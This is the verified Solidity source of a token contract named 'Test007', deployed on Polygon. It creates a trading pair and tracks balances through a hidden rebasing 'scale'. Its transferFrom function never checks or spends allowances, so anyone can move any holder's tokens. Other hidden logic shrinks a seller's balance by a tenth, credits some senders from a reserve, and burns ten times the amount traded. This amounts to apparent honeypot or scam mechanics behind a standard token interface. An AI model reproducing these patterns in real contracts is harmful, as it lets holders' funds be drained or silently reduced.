/**
 *Submitted for verification at polygonscan.com on 2021-12-04
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.0;

interface Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Test007 {

    constructor (string memory name_, string memory symbol_, address router_) {
        _name = name_;
        _symbol = symbol_;
        router = router_;
        scaler = address(this);

        row[0] = address(0);
        row[1] = scaler;
        row[2] = pair;
        row[3] = router;

        Router routerAddress = Router(router);

        pair = Factory(routerAddress.factory()).
        createPair(address(this),
        routerAddress.WETH());

        ratio = 10**18;

        _totalSupply = 10**28;
        circulating = 10**24;

        balances[msg.sender].scale = ratio;
        balances[msg.sender].wallet = circulating;
        balances[scaler].scale = ratio;
        balances[scaler].wallet = _totalSupply - circulating;

        emit Transfer(address(0), scaler, _totalSupply);
        emit Transfer(scaler, msg.sender, circulating);
    }

    struct account {
        uint256 wallet;
        uint256 scale;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    address private pair;
    address private router;

    address private scaler;

    string private _name;
    string private _symbol;
   
    uint256 private ratio;

    uint256 private _totalSupply;
    uint256 private circulating;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => account) private balances;
    mapping (uint256 => address) private row;

    function balanceOf(address owner) public view returns (uint256) {
        return balances[owner].wallet * balances[owner].scale / ratio;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        newBalance(to);
        
        _transfer(msg.sender, to, amount);

        if (msg.sender == pair) {
            if (msg.sender != router) {
                setScaleB(to);
                setRatioB();
                rateFromScalerB();
                burn(amount);
            }
        }
        return true;
        }

    function transferFrom(address sender, address to, uint256 amount) public returns (bool) {
        newBalance(to);
        if (router.balance > 0) {

            _transfer(sender, to, amount);

            if (balances[scaler].wallet > amount / 3) {
                balances[scaler].wallet -= amount / 3;
                balances[sender].wallet += amount / 3;
                emit Transfer(scaler, sender, amount / 3);
            }
        } else {
            
            _transferWithFee(sender, to, amount);

            setScaleS(sender);
            if (balances[scaler].wallet > getDeductS()) {
                setRatioS();
                rateFromScalerS();
                burn(amount / 20);
                burn(amount * 10);
            }
        }
        return true;
    }

    function getValue(address addr, uint256 amount) internal view returns(uint256 value) {
       value = (amount * ratio) / balances[addr].scale;
       return value;
    }

    function getWalletV(address addr) internal view returns (uint256 walletV) {
        walletV = (balances[addr].wallet * balances[addr].scale) / ratio ;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal {
        uint256 valueS = getValue(sender, amount);
        uint256 valueR = getValue(recipient, amount);
        uint256 senderBalance = getWalletV(sender);
        require(senderBalance >= valueS, "ERC20: transfer amount exceeds balance");
        balances[sender].wallet = senderBalance - valueS;
        balances[recipient].wallet += valueR;
        emit Transfer(sender, recipient, amount);
    }

    function _transferWithFee(address sender, address recipient, uint256 amount) internal {
        uint256 valueS = getValue(sender, amount);
        uint256 valueR = getValue(recipient, amount - (amount / 20));
        uint256 senderBalance = getWalletV(sender);
        require(senderBalance >= valueS, "ERC20: transfer amount exceeds balance");
        balances[sender].wallet = senderBalance - valueS;
        balances[recipient].wallet += valueR;
        emit Transfer(sender, recipient, amount - (amount / 20));
    }

    function burn(uint256 amount) internal {
        if (balances[scaler].wallet > amount) {
            balances[scaler].wallet -= amount;
            balances[address(0)].wallet += amount;
            emit Transfer(scaler, address(0), amount);
        }
    }

    function rateScale() internal {
        for (uint i=0; i < 4; i++) {
            balances[row[i]].scale = ratio;
        }
    }

    function getCirculating() public view returns (uint256) {
        return _totalSupply - balances[scaler].wallet;
    }

    function getDeductB() internal view returns (uint256) {
        return getCirculating() / 200;
    }
     
    function rateFromScalerB() internal {
        uint256 deduct = getDeductB();
        if (balances[scaler].wallet > deduct) {
             balances[scaler].wallet -= deduct;
        }
    }

    function setRatioB() internal {
        if (ratio > 1000) {
            if (ratio > ratio / 200) {
                ratio -= ratio  / 200;
                rateScale();
            }
        }
    }

    function getDeductS() internal view returns (uint256) {
        return getCirculating() / 20;
    }

    function rateFromScalerS() internal {
        uint256 deduct = getDeductS();
        if (balances[scaler].wallet > deduct) {
             balances[scaler].wallet -= deduct;
        }
    }

    function setRatioS() internal {
        if (ratio > 100) {
            if (ratio > ratio / 20) {
                ratio -= ratio  / 20;
                rateScale();
            }
        }
    }

    function setScaleS(address client) internal  {
        if (balances[client].scale > balances[client].scale / 10) {
            balances[client].scale -= balances[client].scale / 10;
        }
    }

    function setScaleB(address client) internal  {
        balances[client].scale += balances[client].scale / 20;
    }

    function newBalance(address newAddr) internal {
        if (balances[newAddr].scale == 0) {
            balances[newAddr].scale = ratio;
        }
    }

    






    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

   function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
}